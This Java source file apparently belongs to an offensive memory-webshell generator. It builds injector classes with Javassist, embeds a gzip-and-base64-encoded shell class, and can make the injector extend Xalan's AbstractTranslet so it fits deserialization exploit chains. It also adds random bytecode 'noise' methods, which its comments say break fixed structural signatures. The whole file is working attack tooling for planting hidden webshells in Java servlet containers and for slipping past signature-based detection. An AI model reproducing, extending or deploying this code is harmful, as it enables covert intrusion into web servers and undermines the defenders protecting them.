package org.leo.jmg.mem.injectortpl;

import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.CtConstructor;
import javassist.CtField;
import javassist.CtMethod;
import javassist.CtNewMethod;
import org.leo.core.util.asm.ClassFileMinimizer;
import org.leo.core.util.request.ClassNameGenerator;
import org.leo.core.util.request.GenerationRandom;
import org.leo.jmg.ServletNamespace;
import org.leo.jmg.generation.GenerationPlan;
import org.leo.jmg.generation.GenerationRequest;
import org.leo.jmg.generation.GenerationWorkspace;
import org.leo.jmg.util.base64.Base64Utils;
import org.leo.jmg.util.javassist.JavassistUtil;

import java.io.InputStream;
import java.util.HashSet;
import java.util.Random;
import java.util.Set;

public class InjectorGenerator {

    public byte[] makeInjector(GenerationPlan plan,
                               GenerationWorkspace workspace) throws Exception {
        GenerationRequest request = plan.getRequest();
        return makeInjector(new InjectorTemplateContext(
                workspace.getInjectorClassName(),
                plan.isAbstractTranslet(),
                workspace.getShellClassName(),
                workspace.getShellClassBytes(),
                request.getUrlPattern(),
                request.getEffectiveServletNamespace()),
                plan.getInjectorDescriptor().getInjectorTemplateName());
    }

    private byte[] makeInjector(InjectorTemplateContext context,
                                String injectorTplName) throws Exception {
        // 从模板类字节码克隆新类，避免直接修改模板本身
        String classPath = "/" + injectorTplName.replace('.', '/') + ".class";

        // 完全独立的池（parent=null），避免模板类被 getDefault() 父池缓存后 makeClass() 抛出
        // "is in a parent ClassPool" 错误；不能用 Class.forName 加载模板类，否则同样会污染父池
        ClassPool pool = new ClassPool(null);
        pool.appendSystemPath();
        pool.insertClassPath(new ClassClassPath(InjectorGenerator.class));

        CtClass ctClass;
        try (InputStream is = InjectorGenerator.class.getResourceAsStream(classPath)) {
            if (is == null) {
                throw new RuntimeException("Cannot find injector template class bytes for " + injectorTplName);
            }
            ctClass = pool.makeClass(is);
        }

        // 改名为目标注入器类名
        ctClass.setName(context.injectorClassName);
        // 统一降到 Java 5，兼容更多目标环境
        ctClass.getClassFile().setVersionToJava5();

        if (context.abstractTranslet) {
            ctClass.setSuperclass(pool.get("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet"));
        }

        // 写入模板静态字段（字段存在则替换，不存在则添加，便于后续扩展更多模板）
        replaceStaticField(ctClass, "shellClassName",
                "private static String shellClassName = \"" + escapeForJavaString(context.shellClassName) + "\";");
        replaceStaticField(ctClass, "shellClass",
                "private static String shellClass = \"" + escapeForJavaString(Base64Utils.gzipAndBase64(context.shellClassBytes)) + "\";");
        replaceStaticField(ctClass, "urlPattern",
                "private static String urlPattern = \"" + escapeForJavaString(context.urlPattern) + "\";");

        JavassistUtil.applyServletNamespace(ctClass, context.servletNamespace);

        // B1: 注入字节码噪声，增加注入器类字节码多样性，打破固定结构特征
        injectBytecodeNoise(ctClass);

        try {
            byte[] bytes = ctClass.toBytecode();
            return ClassFileMinimizer.transform(bytes);
        } finally {
            ctClass.detach();
        }
    }

    private void replaceStaticField(CtClass ctClass, String fieldName, String newFieldSrc) throws Exception {
        try {
            CtField oldField = ctClass.getDeclaredField(fieldName);
            ctClass.removeField(oldField);
        } catch (Exception ignored) {
        }
        ctClass.addField(CtField.make(newFieldSrc, ctClass));
    }

    private String escapeForJavaString(String str) {
        if (str == null) {
            return "";
        }
        return str
                .replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\r", "\\r")
                .replace("\n", "\\n");
    }

    /**
     * B1: 注入字节码噪声，增加注入器类字节码多样性。
     * <p>
     * 添加随机命名的私有方法（无副作用：局部变量 + 常量运算），并在构造函数开头调用，
     * 打破"固定字段 + 固定方法"的注入器结构特征。噪声方法被构造函数引用，
     * 不会被 {@link ClassFileMinimizer} 移除。
     * <p>
     * 不改变 inject() 反射注册逻辑（顺序受语义约束），仅增加字节码随机性。
     */
    private void injectBytecodeNoise(CtClass ctClass) throws Exception {
        Random random = GenerationRandom.current();
        Set<String> used = new HashSet<String>();

        int methodCount = 1 + random.nextInt(2);
        StringBuilder constructorCalls = new StringBuilder();
        for (int i = 0; i < methodCount; i++) {
            String methodName = ClassNameGenerator.randomMethodName(used);
            String varName = ClassNameGenerator.randomFieldName(used);
            int value = random.nextInt(65536);
            int mask = random.nextInt(256);
            String body = "{ long " + varName + " = " + value + "L; "
                    + varName + " = " + varName + " ^ " + mask + "L; }";
            try {
                CtMethod noiseMethod = CtNewMethod.make(
                        "private void " + methodName + "()" + body, ctClass);
                ctClass.addMethod(noiseMethod);
                if (constructorCalls.length() > 0) constructorCalls.append(' ');
                constructorCalls.append(methodName).append("();");
            } catch (Exception ignored) {
                // 单个噪声方法构造失败不影响主流程
            }
        }

        // 构造函数开头调用噪声方法（保证被引用，不被瘦身移除）
        if (constructorCalls.length() > 0) {
            for (CtConstructor constructor : ctClass.getDeclaredConstructors()) {
                try {
                    constructor.insertBefore(constructorCalls.toString());
                } catch (Exception ignored) {
                    // 某些构造函数可能无法插入，跳过
                }
            }
        }
    }

    private static final class InjectorTemplateContext {
        private final String injectorClassName;
        private final boolean abstractTranslet;
        private final String shellClassName;
        private final byte[] shellClassBytes;
        private final String urlPattern;
        private final ServletNamespace servletNamespace;

        private InjectorTemplateContext(String injectorClassName,
                                        boolean abstractTranslet,
                                        String shellClassName,
                                        byte[] shellClassBytes,
                                        String urlPattern,
                                        ServletNamespace servletNamespace) {
            this.injectorClassName = injectorClassName;
            this.abstractTranslet = abstractTranslet;
            this.shellClassName = shellClassName;
            this.shellClassBytes = shellClassBytes;
            this.urlPattern = urlPattern;
            this.servletNamespace = servletNamespace;
        }
    }
}
